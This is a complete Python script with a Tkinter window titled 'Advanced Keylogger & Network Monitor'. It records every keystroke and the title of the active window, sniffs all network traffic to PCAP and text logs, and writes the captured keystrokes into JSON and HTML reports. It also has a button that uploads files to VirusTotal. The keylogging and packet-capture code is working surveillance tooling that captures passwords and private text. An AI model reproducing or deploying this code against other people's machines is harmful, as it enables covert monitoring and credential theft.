import os
import threading
import time
import pygetwindow as gw
import scapy.all as scapy
import json
import requests
from datetime import datetime
import tkinter as tk
from tkinter import messagebox, filedialog
from pynput import keyboard

# Globals
window_data = []
keylogger_data = []
captured_packets = []
network_logs_text = []
monitoring_threads = []
monitoring_active = False
stop_event = threading.Event()

VIRUSTOTAL_API_KEY = 'Replace with your valid API key'  

def monitor_windows():
    while not stop_event.is_set():
        active_window = gw.getActiveWindow()
        if active_window:
            title = active_window.title
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            window_data.append({"timestamp": timestamp, "window_title": title})
        time.sleep(2)

def start_keylogger():
    def on_press(key):
        try:
            key_char = key.char
        except AttributeError:
            key_char = str(key)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        keylogger_data.append({"timestamp": timestamp, "key": key_char})

    def on_release(key):
        if stop_event.is_set():
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def monitor_network():
    def process_packet(packet):
        captured_packets.append(packet)
        summary = f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {packet.summary()}"
        network_logs_text.append(summary)

    while not stop_event.is_set():
        try:
            scapy.sniff(prn=process_packet, store=False, timeout=1)
        except Exception as e:
            print(f"[Network Error] {e}")
            break

def save_pcap():
    if captured_packets:
        filename = f"network_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        scapy.wrpcap(filename, captured_packets)
        return filename
    return None

def save_network_txt():
    if network_logs_text:
        filename = f"network_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            for line in network_logs_text:
                f.write(line + '\n')
        return filename
    return None

def scan_file_virustotal(filepath):
    headers = {'x-apikey': VIRUSTOTAL_API_KEY}
    with open(filepath, 'rb') as f:
        files = {'file': (os.path.basename(filepath), f)}
        response = requests.post('https://www.virustotal.com/api/v3/files', files=files, headers=headers)

    if response.status_code == 200:
        analysis_id = response.json()['data']['id']
        report_url = f"https://www.virustotal.com/api/v3/analyses/{analysis_id}"
        for _ in range(10):
            analysis_response = requests.get(report_url, headers=headers)
            if analysis_response.status_code == 200:
                analysis_data = analysis_response.json()
                status = analysis_data["data"]["attributes"]["status"]
                if status == "completed":
                    final_link = f"https://www.virustotal.com/gui/file/{analysis_data['meta']['file_info']['sha256']}/detection"
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    with open(f"virustotalresultlink_{timestamp}.txt", "w") as vrf:
                        vrf.write(final_link)
                    return final_link
            time.sleep(3)
            time.sleep(3)
        return "Analysis still in progress. Try later."
    else:
        return f"Upload failed: {response.status_code}"

def save_logs_and_generate_html(pcap_file):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    json_file = f"logs_{timestamp}.json"
    html_file = f"logs_report_{timestamp}.html"

    data = {
        "windows": window_data,
        "keys": keylogger_data,
        "pcap_file": pcap_file
    }

    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)

    html_content = f"""
<!DOCTYPE html>
<html lang=\"en\">
<head>
    <meta charset=\"UTF-8\">
    <title>Log Report</title>
    <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css\" rel=\"stylesheet\">
    <style>
        body {{ background-color: #0f0f0f; color: #39ff14; font-family: monospace; }}
        table {{ color: white; }}
        .container {{ margin-top: 20px; }}
    </style>
</head>
<body>
<div class=\"container\">
    <h1 class=\"text-success\">📋 Monitoring Report</h1>
    <hr/>
    <h3>📁 PCAP File</h3>
    <p>{pcap_file if pcap_file else 'No network packets captured.'}</p>

    <h3>🪟 Window Activity</h3>
    <table class=\"table table-dark table-striped\"><thead><tr><th>Time</th><th>Window Title</th></tr></thead><tbody>
    {''.join(f'<tr><td>{entry['timestamp']}</td><td>{entry['window_title']}</td></tr>' for entry in window_data)}
    </tbody></table>

    <h3>⌨️ Key Logs</h3>
    <table class=\"table table-dark table-striped\"><thead><tr><th>Time</th><th>Key</th></tr></thead><tbody>
    {''.join(f'<tr><td>{entry['timestamp']}</td><td>{entry['key']}</td></tr>' for entry in keylogger_data)}
    </tbody></table>
</div>
</body>
</html>
"""
    with open(html_file, 'w', encoding='utf-8') as f:
        f.write(html_content)

    return json_file, html_file

def create_gui():
    def start_detection():
        global monitoring_active, stop_event, window_data, keylogger_data, captured_packets, network_logs_text

        if not monitoring_active:
            window_data.clear()
            keylogger_data.clear()
            captured_packets.clear()
            network_logs_text.clear()
            stop_event.clear()
            monitoring_active = True

            monitoring_threads.clear()
            monitoring_threads.append(threading.Thread(target=monitor_windows, daemon=True))
            monitoring_threads.append(threading.Thread(target=start_keylogger, daemon=True))
            monitoring_threads.append(threading.Thread(target=monitor_network, daemon=True))

            for thread in monitoring_threads:
                thread.start()

            messagebox.showinfo("Info", "Monitoring started")
        else:
            messagebox.showwarning("Warning", "Monitoring is already running")

    def stop_detection():
        global monitoring_active, stop_event

        if monitoring_active:
            stop_event.set()
            monitoring_active = False
            for thread in monitoring_threads:
                thread.join(timeout=3)

            pcap_file = save_pcap()
            txt_file = save_network_txt()
            json_file, html_file = save_logs_and_generate_html(pcap_file)

            messagebox.showinfo("Monitoring Stopped", f"Logs saved:\nJSON: {json_file}\nHTML: {html_file}\nPCAP: {pcap_file if pcap_file else 'None'}\nNetLog: {txt_file if txt_file else 'None'}")
        else:
            messagebox.showwarning("Warning", "Monitoring is not active")

    def scan_file():
        file_path = filedialog.askopenfilename(title="Select a file to scan")
        if file_path:
            result = scan_file_virustotal(file_path)
            messagebox.showinfo("VirusTotal Scan Result", result)

    root = tk.Tk()
    root.title("Advanced Monitor")
    root.geometry("400x350")

    tk.Label(root, text="Advanced Keylogger & Network Monitor", font=("Arial", 14)).pack(pady=10)
    tk.Button(root, text="Start Monitoring", width=30, command=start_detection).pack(pady=5)
    tk.Button(root, text="Stop Monitoring & Save Logs", width=30, command=stop_detection).pack(pady=5)
    tk.Button(root, text="Scan File with VirusTotal", width=30, command=scan_file).pack(pady=5)

    root.mainloop()

if __name__ == "__main__":
    create_gui()
